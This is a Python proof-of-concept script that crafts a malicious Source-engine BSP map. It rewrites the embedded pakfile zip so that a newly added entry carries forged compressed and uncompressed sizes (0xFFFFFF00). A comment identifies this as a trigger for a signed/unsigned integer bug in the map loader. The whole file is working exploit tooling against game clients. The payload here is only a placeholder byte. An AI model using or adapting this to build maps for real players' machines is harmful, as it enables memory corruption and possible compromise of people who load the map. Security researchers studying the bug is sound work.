import zipfile
import argparse
import logging
from fastlog import log
import os
import struct

PAYLOAD = b"\x41"

# offset in the ZIPDIRENTRY to the compressed and uncompressed sizes
ZIP_DIRENTRY_OFFSET_TO_COMPRESSED_SIZE = 20

# offset into the BSP for the location of the pakfile lump
BSP_OFFSET_TO_PAKFILE_LUMP = 0x288

# there are two packed integers there, fileoffset and filelength
BSP_LUMP_DESC = "<LL"

# header of the ZIPDIRENTRY structure
ZIP_DIRENTRY_SIGNATURE = b"\x50\x4B\x01\x02"

# absolute path to this script
abs_path = os.path.dirname(os.path.realpath(__file__))

# parse some arguments in
aparse = argparse.ArgumentParser()
aparse.add_argument("--map", required=True)
aparse.add_argument("--file_name", required=True)
aparse.add_argument("--out", required=True)

args = aparse.parse_args()

log.info("map: %s", args.map)
log.info("file_name: %s", args.file_name)
log.info("out_file: %s", args.out)

# open the output file now so we're ready
out_file = open(args.out, "wb")

# open either the template bsp by name, or an absolute file path
try:
    file_bytes = open(args.map, "rb").read()
except FileNotFoundError:
    file_bytes = open(os.path.join(abs_path, "./templates/", args.map), "rb").read()

log.info("file size: 0x%04X", len(file_bytes))

# unpack the pakfile lump from BSP
zip_header, zip_length = struct.unpack(
    BSP_LUMP_DESC,
    file_bytes[BSP_OFFSET_TO_PAKFILE_LUMP : BSP_OFFSET_TO_PAKFILE_LUMP + 8],
)
log.info("pakfile offset: 0x%04X", zip_header)
log.info("pakfile length: 0x%04X", zip_length)

# extract the pack zip to a temporary zip file

log.info("extracting zip...")
temp_zip_path = os.path.join(abs_path, "temp.zip")
temp_zip = open(temp_zip_path, "wb+")
temp_zip.write(file_bytes[zip_header:])
temp_zip.seek(0, os.SEEK_SET)
log.success("extracted to temp.zip")

# parse and print out the contents of the zip as it exists
log.info("printout of current zip contents: ")
zip_file = zipfile.ZipFile(temp_zip, mode="a")
zip_file.printdir()


# create a zipinfo structure for our evil file
template_zinfo = zip_file.infolist()[0]
zinfo = zipfile.ZipInfo(args.file_name, date_time=template_zinfo.date_time)
zinfo.compress_type = template_zinfo.compress_type
zinfo._compresslevel = template_zinfo._compresslevel
zinfo.external_attr = template_zinfo.external_attr
# filled in automatically
zinfo.file_size = 0
zinfo.compress_size = 0

# write it out to a new zip file
temp_zip_path = os.path.join(abs_path, "temp.zip")
temp_zip = open(temp_zip_path, "wb+")
zip_file = zipfile.ZipFile(temp_zip, mode="w")
with zip_file._lock:
    with zip_file.open(zinfo, mode="w") as dest:
        dest.write(PAYLOAD)

# flush the contents out to the file pointer and write the end of directory record
zip_file.close()

# print the contents again, with our new file
log.success("wrote out file %s to pack", args.file_name)

log.info("attempting to find ZIPDIRENTRY for the new file...")

# seek to end minus the size of the directory locator and search backwards for the ZIPDIRENTRY
# for our newly created file (0x50, 0x4B, 0x01, 0x02)
# totally a hack, but read up to 1024 bytes from the end of the file and find the last occurance
# of the signature
SOME_REASONABLE_SIZE = 100

# seek to -1024 from end of file
temp_zip.seek(-SOME_REASONABLE_SIZE, os.SEEK_END)

# read up to 1024 bytes
last_bytes = temp_zip.read(SOME_REASONABLE_SIZE)

# find the last occurance of the ZIPDIRENTRY structure
last_zip_dir_entry = last_bytes.rfind(ZIP_DIRENTRY_SIGNATURE)
if last_zip_dir_entry == -1:
    log.exception("failed to find ZIPDIRENTRY signature")
log.info(f"found ZIPDIRENTRY signature at: {last_zip_dir_entry}")

# seek to that last occurance
temp_zip.seek(last_zip_dir_entry - SOME_REASONABLE_SIZE, os.SEEK_END)

# print out what proably contains the header
log.hexdump(temp_zip.read(64))
temp_zip.seek(-64, os.SEEK_CUR)

# seek to the compressed and uncompressed sizes
temp_zip.seek(ZIP_DIRENTRY_OFFSET_TO_COMPRESSED_SIZE, os.SEEK_CUR)

# read the two values there
compressed_size = struct.unpack("<L", temp_zip.read(4))[0]
uncompressed_size = struct.unpack("<L", temp_zip.read(4))[0]

# verify that they match the size we expect... so that we're not crazy!
log.info("compressed_size: %02X" % compressed_size)
log.info("uncompressed_size: %02X" % uncompressed_size)
log.info("payload_size: %02X" % len(PAYLOAD))

if compressed_size != len(PAYLOAD) or uncompressed_size != len(PAYLOAD):
    log.exception("failed to match compressed/uncompressed sizes with expected payload")

# seek back, and write in our hacked values
temp_zip.seek(-8, os.SEEK_CUR)

# >>> The bug! The uncompressed size is interpreted as a *signed* integer, but when read from the file pointer, is read as an *unsigned* integer
TARGET_SIZE = 0xFFFFFF00
temp_zip.write(struct.pack("<L", TARGET_SIZE))
temp_zip.write(struct.pack("<L", TARGET_SIZE))

# read back in all the data of the new zip we created
temp_zip.seek(0, os.SEEK_SET)
splice_zip = temp_zip.read()

# splice the zip pack onto the bsp
splice_bsp = bytearray(file_bytes)
# remove the old zip
del splice_bsp[zip_header:]
# splice in our new one
splice_bsp[zip_header:] = splice_zip

log.success("new bsp size: 0x%04X", len(splice_bsp))

log.info("new pakfile length: 0x%04X", len(splice_zip))
log.info("patching bsp lump header length...")

# create a new lump for the BSP with our modified length
new_lump = struct.pack(BSP_LUMP_DESC, zip_header, len(splice_zip))

# and patch it in
splice_bsp[BSP_OFFSET_TO_PAKFILE_LUMP : BSP_OFFSET_TO_PAKFILE_LUMP + 8] = new_lump

log.info("writing out final bsp to %s...", args.out)

out_file.write(splice_bsp)

log.info("deleting temp zip...")
temp_zip.close()
os.unlink(temp_zip_path)

log.success("script complete!")
